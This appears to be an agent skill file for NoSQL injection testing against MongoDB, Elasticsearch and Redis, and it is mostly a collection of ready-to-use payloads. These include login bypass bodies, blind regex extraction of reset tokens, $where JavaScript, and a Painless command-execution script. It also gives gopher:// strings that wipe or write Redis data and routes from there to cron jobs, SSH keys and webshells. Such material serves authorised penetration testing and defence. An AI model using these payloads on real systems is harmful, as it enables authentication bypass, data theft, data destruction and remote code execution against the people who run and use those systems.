---
name: nosql_injection
description: NoSQL injection testing for MongoDB, Redis, Elasticsearch covering operator injection, auth bypass, and blind data extraction
---

# NoSQL Injection

NoSQL databases trade relational structure for flexibility — and that flexibility creates injection surfaces that differ from classic SQLi but are equally critical. A single `{"$ne": null}` in a login body can bypass authentication entirely. Test every endpoint that touches a document store.

## Attack Surface

**Databases**
- MongoDB — operator injection via JSON body or URL-encoded parameters
- Redis — SSRF-to-RESP protocol injection, Lua script execution via EVAL
- Elasticsearch — query DSL script injection (`painless` scripts → RCE in older versions)
- CouchDB — Mango query injection, JavaScript view functions
- Firebase Firestore — client-side rule bypass (see firebase_firestore skill)

**Integration Paths**
- REST APIs accepting JSON bodies (most common)
- URL-encoded form fields parsed by Express/PHP body parsers (`username[$ne]=x`)
- GraphQL resolvers passing arguments directly to query builders
- Search endpoints with user-controlled filters

## Detection

**Boolean Differential**
Send two requests: one normal, one with an operator injected. Different response length/content = injection confirmed.
```
Normal:   {"username": "admin", "password": "x"}         → 401
Injected: {"username": "admin", "password": {"$ne": ""}} → 200
```

**Error-Based**
Stack traces from Mongoose/MongoDB driver leak field names, collection names, and operator errors. Look for `MongoError`, `CastError`, `ValidationError` in responses.

**Timing**
MongoDB `$where` with `sleep()`:
```json
{"username": {"$where": "sleep(3000) || 1"}, "password": "x"}
```

## Key Vulnerabilities

### MongoDB Operator Injection

**Authentication Bypass**
```json
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$in": ["admin", "administrator", "root"]}, "password": {"$ne": ""}}
```

URL-encoded form (Express `qs` library, PHP):
```
username[$ne]=x&password[$ne]=x
username[$regex]=.*&password[$ne]=x
```

**Blind Data Extraction via `$regex`**
Extract field values character by character:
```json
{"username": "admin", "reset_token": {"$regex": "^a"}}
{"username": "admin", "reset_token": {"$regex": "^ab"}}
```
Binary search reduces requests: start with `^[a-m]` to halve the keyspace.

**`$where` JavaScript Injection**
```json
{"$where": "this.username == 'admin' && this.password.match(/^a/)"}
{"$where": "function() { return sleep(3000) || this.role == 'admin'; }"}
```
Note: `$where` disabled in MongoDB 4.4+ by default — check server version.

**Array/Object Coercion**
When the application expects a string but doesn't validate type:
```json
{"sort": {"$ne": 1}}
{"fields": {"__proto__": 1}}
```

### Elasticsearch Script Injection

Painless script injection in `_search` queries:
```json
{
  "query": {
    "script": {
      "script": {
        "lang": "painless",
        "source": "Runtime.getRuntime().exec('id')"
      }
    }
  }
}
```
Older Elasticsearch (< 6.x) runs Groovy scripts — different RCE payloads apply.

### Redis via SSRF (RESP Protocol)

If an SSRF vulnerability allows `gopher://` scheme:
```
gopher://redis-host:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A
gopher://redis-host:6379/_%2A3%0D%0A%243%0D%0ASET%0D%0A%243%0D%0Afoo%0D%0A%243%0D%0Abar%0D%0A
```
With write access to Redis, escalate to RCE via:
- `CONFIG SET dir /var/spool/cron/` + `SET` a cron job
- Write SSH authorized_keys
- Write a PHP/Python webshell to the web root

## Bypass Techniques

**Content-Type Switching**
Application validates `Content-Type: application/x-www-form-urlencoded` but not JSON:
```
Content-Type: application/json
{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

**WAF Bypass via `$comment`**
```json
{"username": {"$ne": "", "$comment": "bypass"}, "password": {"$ne": ""}}
```

**Mongoose `strict: false`**
When strict mode is off, any field is passed to the query. Inject extra fields:
```json
{"username": "admin", "isAdmin": true, "password": {"$ne": ""}}
```

**Array Operator Abuse**
```json
{"roles": {"$elemMatch": {"$ne": "user"}}}
```

## Tools

- **Python + aiohttp** — Operator spraying and blind extraction scripts (no dedicated tool; write custom)
- **nuclei** — Community templates for MongoDB auth bypass: `nuclei -t nuclei-templates/vulnerabilities/nosqli/`
- **sqlmap** — Has limited NoSQL support: `sqlmap --dbms=MongoDB`
- **Burp Suite / Caido** — Intercept and modify JSON bodies; use Repeater for manual operator injection

## Testing Methodology

1. Identify all endpoints accepting JSON or form-encoded parameters that interact with a document store (stack fingerprinting, error messages, response structure)
2. On login/auth endpoints: attempt operator injection auth bypass (`$ne`, `$gt`, `$regex`) in both JSON and URL-encoded forms
3. On search/filter endpoints: inject `$where`, `$regex`, `$gt`/`$lt` operators into every filterable field
4. If injection is confirmed via boolean differential: escalate to blind data extraction using `$regex` binary search
5. Check for `$where` availability (MongoDB < 4.4 with `--enableJavaScriptEngine`)
6. On endpoints with SSRF potential: test gopher:// to Redis for RESP injection
7. For Elasticsearch: test `_search` with `script` queries on older instances
8. Document: injection point, operator used, data extracted or auth bypass demonstrated

## Pro Tips

- Always check `package.json` / `requirements.txt` for `mongoose < 7` — older versions have more permissive defaults
- `Mongoose strict: false` is the silent killer — grep source code for it: `grep -r "strict: false"`
- The `qs` library in Node.js automatically parses `field[operator]=value` into `{field: {operator: value}}` — test both JSON and URL-encoded even when the API says it's JSON-only
- Injection works inside nested objects too: `{"user": {"profile": {"name": {"$ne": ""}}}}`
- MongoDB Atlas has stricter operator validation — but self-hosted instances often don't
- Use `interactsh-client` for OOB callback confirmation when responses are identical regardless of payload
